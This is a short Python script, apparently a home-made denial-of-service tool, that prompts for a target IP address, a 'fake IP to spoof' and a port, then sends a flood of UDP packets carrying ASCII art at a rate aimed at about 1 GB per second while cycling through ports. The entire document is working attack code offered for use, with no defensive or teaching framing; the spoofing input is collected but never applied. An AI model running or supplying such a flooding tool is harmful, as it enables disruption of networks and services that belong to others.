import socket
import time

print("\n\n")
print("         +-------------------------------------+")
print("         |          Author: cerberus           |")
print("         |            Version: 0.1             |")
print("         +-------------------------------------+ ")

print("\n\n")
print("Enter IP Address of The Target ")
try:
    target = input("\t == > ")
except:
    print("Error: Invalid IP Address")
print("Enter The Fake IP Address that you want to spoof.")
try:
    fake_ip = input("\t\t ==> ")
except:
    print("Error: Invalid Fake IP Address")
print("Enter The Port Number You Want to Attack ? ")
try:
    port = int(input("\t\t ==> "))
except:
    print("Error: Invalid Port Number")

BYTES_PER_GB = 1024 * 1024 * 1024  # Bytes in 1 GB

# Calculate the size of the ASCII art
cerberus_ascii_art = """
                            /\\_/\\____,
                  ,___/\\_/\\ \\  ~     /
                  \\     ~  \\ )   XXX
                    XXX     /    /\\_/\\___,
                       \\o-o/-o-o/   ~    /
                        ) /     \\    XXX
                      _|    / \\ \\_/
                     /   _  \\_/   \\
                   / (   /____,__|  )
                  (  |_ (    )  \\) _|
                 _/ _)   \\   \\__/   (_
                 (,-(,(,(,/      \\,),),)

"""

packet_size = len(cerberus_ascii_art.encode())  # Size of each packet

# Calculate the data transfer size (1 GB)
data_transfer_size = BYTES_PER_GB

# Calculate the number of packets needed to achieve the transfer rate
num_packets = data_transfer_size // packet_size

# Calculate the time interval (in seconds) for 1 GB/s transfer rate
time_interval_seconds = 1 / num_packets

def attack(target, port, num_packets, time_interval_seconds):
    global attack_num
    attack_num = 0

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(num_packets):
            data_packet = cerberus_ascii_art.encode()
            sock.sendto(data_packet, (target, port))
            time.sleep(time_interval_seconds)  # Add a time interval between sending packets
            attack_num += 1
            port = (port + 1) % 65535
            print(f"Sent {attack_num} packet to {target} through port: {port}")
    except  Exception as  e:
        print("An error occurred during the attack:", e)

attack(target, port, num_packets, time_interval_seconds)
